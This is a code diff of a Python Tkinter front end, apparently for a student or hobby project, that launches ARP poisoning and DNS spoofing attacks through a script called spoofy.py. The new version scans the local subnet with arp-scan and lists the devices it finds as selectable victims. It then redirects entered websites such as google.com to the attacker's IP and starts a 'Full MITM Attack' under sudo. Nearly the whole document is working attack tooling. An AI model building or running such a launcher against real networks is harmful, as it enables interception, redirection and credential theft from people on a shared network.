@@ -1,134 +1,127 @@
-import os
-import threading
-import subprocess
-import webbrowser
-import socket
-import tkinter as tk
-from tkinter import messagebox
+import os, subprocess, socket, threading, tkinter as tk
+from tkinter import messagebox, ttk
 
-# Function to get the local IP address dynamically
-def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# --- Automated Network Discovery ---
+
+def get_network_info():
+    """Detects Attacker IP and Gateway automatically."""
     try:
-        # Doesn't have to be reachable
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('10.255.255.255', 1))
-        IP = s.getsockname()[0]
-    except:
-        IP = '127.0.0.1'
-    finally:
+        local_ip = s.getsockname()[0]
         s.close()
-    return IP
+        cmd = "ip route | grep default | awk '{print $3}'"
+        gateway_ip = subprocess.check_output(cmd, shell=True).decode().strip()
+        return local_ip, gateway_ip
+    except:
+        return "127.0.0.1", "192.168.1.1"
 
-
-# Paths and constants
-PROJECT_PATH = os.path.dirname(os.path.abspath(__file__))
-SPOOFY_PATH = os.path.join(PROJECT_PATH, "spoofy.py")
-DNS_FILE = os.path.join(PROJECT_PATH, "dnsSpoofed.txt")
-SPOOF_SITE_FOLDER = os.path.join(PROJECT_PATH, "spoof_site")
-INDEX_HTML_PATH = os.path.join(SPOOF_SITE_FOLDER, "index.html")
-
-def save_values(gateway_ip, victim_ip, spoof_website):
-    if not gateway_ip or not victim_ip or not spoof_website:
-        messagebox.showerror("Error", "All fields must be filled in.")
-        return False
-
-    # Save DNS spoof info
-    with open(DNS_FILE, "w") as f:
-        f.write(f"{spoof_website}:{attacker_ip_var.get().strip()}\n")
+def scan_network():
+    attacker_ip, gateway_ip = get_network_info()
+    subnet = ".".join(attacker_ip.split('.')[:-1]) + ".0/24"
     
-    # Generate the spoof HTML page
-    html_content = f"""
-<!DOCTYPE html>
-<html>
-<head>
-<title>Custom Spoof Page</title>
-</head>
-<body style="text-align:center; margin-top:50px; font-family:Arial;">
-<h1>DNS Spoof Demo</h1>
-<p>Website spoofed: <b>{spoof_website}</b></p>
-<p>Attacker IP: <b>{gateway_ip}</b></p>
-<p>Victim IP: <b>{victim_ip}</b></p>
-</body>
-</html>
-"""
-    with open(INDEX_HTML_PATH, "w") as f:
-        f.write(html_content)
-
-    return True
-
-def run_spoofy():
-    cmd = [
-        "sudo",
-        "python3",
-        SPOOFY_PATH,
-        "-t",
-        victim_ip_var.get(),
-        "-g",
-        gateway_ip_var.get(),
-        "-d",
-        DNS_FILE
-    ]
     try:
-        subprocess.run(cmd, check=True)
-        # Open index.html instead of the real website
-        webbrowser.open(IP_ADDRESS + "/index.html")
-        messagebox.showinfo("Success", "Spoofy script started and webpage opened.")
-    except subprocess.CalledProcessError as e:
-        messagebox.showerror("Error", f"Failed to run script: {e}")
+        # Improved regex to only match digits and dots (IP addresses)
+        output = subprocess.check_output(f"sudo arp-scan {subnet} | grep -oE '([0-9]{{1,3}}\\.){{3}}[0-9]{{1,3}}'", shell=True).decode()
+        
+        found_ips = []
+        for ip in output.split('\n'):
+            ip = ip.strip()
+            # AUTOMATION: Filter out Attacker, Gateway, Host (.1), and the Interface text
+            if ip and ip != attacker_ip and ip != gateway_ip and not ip.endswith(".1") and not ip.endswith(".254"):
+                found_ips.append(ip)
+        
+        return sorted(list(set(found_ips)))
+    except Exception as e:
+        print(f"Scan error: {e}")
+        return ["No victims found"]
 
-def start_http_server():
-    os.chdir(SPOOF_SITE_FOLDER)
-    # Check if port 80 is free
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        if sock.connect_ex(('127.0.0.1', 80)) == 0:
-            messagebox.showerror("Error", "Port 80 is already in use.")
-            return
-    from http.server import SimpleHTTPRequestHandler
-    from socketserver import TCPServer
-    with TCPServer(("", 80), SimpleHTTPRequestHandler) as httpd:
-        print("Serving at port 80")
-        httpd.serve_forever()
+# --- UI Actions ---
 
-def on_save():
-    global IP_ADDRESS
-    gateway_ip = gateway_ip_var.get().strip()
-    victim_ip = victim_ip_var.get().strip()
-    spoof_website = website_var.get().strip()
-    attacker_ip = attacker_ip_var.get().strip()
-    if save_values(gateway_ip, victim_ip, spoof_website):
-        # Start server thread
-        threading.Thread(target=start_http_server, daemon=True).start()
-        # Run spoof script
-        run_spoofy()
-    # Set IP_ADDRESS dynamically
-    IP_ADDRESS = "http://" + victim_ip_var.get()
+def refresh_ips():
+    """Triggered by the Refresh button to update the victim listbox."""
+    status_label.config(text="Scanning network... please wait.")
+    root.update()
+    
+    # Clear the listbox first
+    victim_listbox.delete(0, tk.END)
+    
+    new_ips = scan_network()
+    
+    # Insert each IP found into the listbox
+    if new_ips and new_ips[0] != "No victims found":
+        for ip in new_ips:
+            victim_listbox.insert(tk.END, ip)
+        status_label.config(text=f"Scan complete. Found {len(new_ips)} devices.")
+    else:
+        status_label.config(text="No devices found.")
 
+def on_save_and_run():
+    # Get all selected items from the listbox
+    selected_indices = victim_listbox.curselection()
+    if not selected_indices:
+        messagebox.showerror("Error", "Please select at least one Victim IP.")
+        return
+    
+    # Join them with commas: "192.168.1.5,192.168.1.10"
+    victims = ",".join([victim_listbox.get(i) for i in selected_indices])
+    
+    # Get websites (Comma separated: google.com, facebook.com)
+    website_raw = website_var.get().strip()
+    if not website_raw:
+        messagebox.showerror("Error", "Please enter at least one Target Website.")
+        return
 
-# Create the UI
+    attacker_ip, gateway = get_network_info()
+
+    # Write multiple websites to the DNS file
+    dns_file = os.path.join(os.path.dirname(__file__), "dnsSpoofed.txt")
+    with open(dns_file, "w") as f:
+        site_list = [s.strip() for s in website_raw.split(",")]
+        for site in site_list:
+            f.write(f"{site}:{attacker_ip}\n")
+
+    # Launch Engine with the victims list
+    cmd = ["x-terminal-emulator", "-e", "sudo", "python3", "spoofy.py",
+           "-t", victims, "-g", gateway, "-d", dns_file, "--mode", attack_mode.get()]
+    subprocess.Popen(cmd)
+    status_label.config(text=f"Attack running on {len(selected_indices)} targets.")
+
+# --- The UI ---
 root = tk.Tk()
-root.title("ARP/DNS Spoof Configuration Tool")
-root.geometry("500x300")
-root.resizable(False, False)
+root.title("Automated Modular MITM Framework")
+root.geometry("500x600")
+root.configure(bg="#d9d9d9")
 
-# Input fields
-tk.Label(root, text="Gateway", font=("Arial", 11)).pack(pady=5)
-gateway_ip_var = tk.StringVar()
-tk.Entry(root, textvariable=gateway_ip_var, width=40).pack()
+main_frame = tk.Frame(root, bg="#d9d9d9")
+main_frame.pack(expand=True, padx=20)
 
-tk.Label(root, text="Attacker IP:", font=("Arial", 11)).pack(pady=5)
-attacker_ip_var = tk.StringVar()
-tk.Entry(root, textvariable=attacker_ip_var, width=40).pack()
+# 1. Victim Selection (Automated)
+tk.Label(main_frame, text="Select Victim IPs (Hold Ctrl to select multiple):", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)
 
-tk.Label(root, text="Victim IP:", font=("Arial", 11)).pack(pady=5)
-victim_ip_var = tk.StringVar()
-tk.Entry(root, textvariable=victim_ip_var, width=40).pack()
+victim_listbox = tk.Listbox(main_frame, selectmode="multiple", width=40, height=6, bg="white")
+victim_listbox.pack()
 
-tk.Label(root, text="Website to Spoof (e.g., example.org):", font=("Arial", 11)).pack(pady=5)
+tk.Button(main_frame, text="Scan Network", command=refresh_ips, bg="#cfcfcf").pack(pady=5)
+
+# 2. Website Targeting
+tk.Label(main_frame, text="Target Website:", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)
 website_var = tk.StringVar()
-tk.Entry(root, textvariable=website_var, width=40).pack()
+tk.Entry(main_frame, textvariable=website_var, width=40).pack()
 
-# Button
-tk.Button(root, text="Save & Run", command=on_save, width=20, height=2).pack(pady=15)
+# 3. Flexible Attack Selection (Removed ARP+SSL)
+tk.Label(main_frame, text="Attack Implementation:", bg="#d9d9d9", font=("Arial", 11, "bold")).pack(pady=15)
+attack_mode = tk.StringVar(value="full")
+modes = [("ARP Poisoning Only", "arp"), ("ARP + DNS Spoofing", "dns"), ("Full MITM Attack", "full")]
 
-# Run the UI
+for text, val in modes:
+    tk.Radiobutton(main_frame, text=text, variable=attack_mode, value=val, bg="#d9d9d9").pack(anchor="w", padx=60)
+
+# 4. Action Button
+tk.Button(main_frame, text="START ATTACK", command=on_save_and_run, width=25, height=2, bg="#efefef", relief="raised").pack(pady=30)
+
+# Footer Status
+status_label = tk.Label(root, text="Ready", bg="#d9d9d9", font=("Arial", 8, "italic"))
+status_label.pack(side="bottom", pady=5)
+
 root.mainloop()
